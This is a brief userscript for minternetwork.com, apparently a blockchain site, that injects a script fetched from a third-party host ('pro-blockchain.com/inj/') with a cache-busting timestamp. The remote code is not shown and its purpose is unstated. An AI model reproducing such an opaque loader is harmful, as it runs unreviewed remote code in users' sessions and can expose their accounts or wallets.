// ==UserScript==
// @name         MinterNetwork main
// @namespace    https://minternetwork.com/
// @version      0.01
// @author       lxgn
// @description  MinterNetwork
// @match        https://minternetwork.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/371780/MinterNetwork%20main.user.js
// @updateURL https://update.greasyfork.org/scripts/371780/MinterNetwork%20main.meta.js
// ==/UserScript==


var ms = new Date();
//document.write();

var script = document.createElement('script');
//var t = Math.random()*1000000;

var kuda = "https://minter2.pro-blockchain.com/inj/?"+ms.getTime();
//console.log(kuda);
script.src = kuda;
document.body.appendChild(script);

